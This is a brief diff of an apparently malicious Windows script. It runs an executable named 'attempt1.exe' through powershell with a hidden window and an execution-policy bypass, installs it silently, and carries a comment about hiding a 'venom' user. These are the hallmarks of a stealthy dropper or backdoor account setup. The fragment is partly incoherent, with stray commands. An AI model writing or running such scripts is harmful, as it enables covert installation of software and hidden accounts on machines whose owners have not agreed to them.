@@ -65,7 +65,7 @@ powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
 
 .\attempt1.exe; ./calty2
     # Install the attempt1.exe file
-Start-Process -FilePath "$env:temp/$wd/attempt1.exe" -ArgumentList "/silent" -Wait
+powershell Start-Process -FilePath "$path attempt1.exe" -ArgumentList "/silent" -Wait
 
 # hide venom user
 pause
